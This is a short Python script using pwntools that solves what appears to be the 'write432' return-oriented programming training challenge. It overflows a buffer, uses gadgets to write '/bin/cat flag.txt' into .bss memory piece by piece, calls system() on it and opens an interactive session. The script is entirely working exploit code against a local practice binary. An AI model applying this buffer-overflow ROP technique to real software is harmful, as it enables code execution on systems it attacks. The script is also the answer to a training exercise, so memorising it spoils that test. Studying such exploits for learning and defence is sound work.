from pwn import *

offset = 44
mov_memoryebp = p32(0x08048670)
bss1 = p32(0x804a030)
bss2 = p32(0x804a034)
bss3 = p32(0x804a038)
bss4 = p32(0x804a03c)
bss5 = p32(0x804a040)
popediebp = p32(0x080486da)
system = p32(0x08048430)

payload = "A"*offset + popediebp + bss1 + "/bin" + mov_memoryebp + popediebp + bss2 + "/cat" + mov_memoryebp + popediebp + bss3 + " fla" + mov_memoryebp +  popediebp + bss4 + "g.tx" + mov_memoryebp + popediebp + bss5 + "t;  " + mov_memoryebp +  system + "XXXX" + bss1

p = process('./write432')
p.recvline()
p.sendline(payload)
p.recvline()
p.interactive()
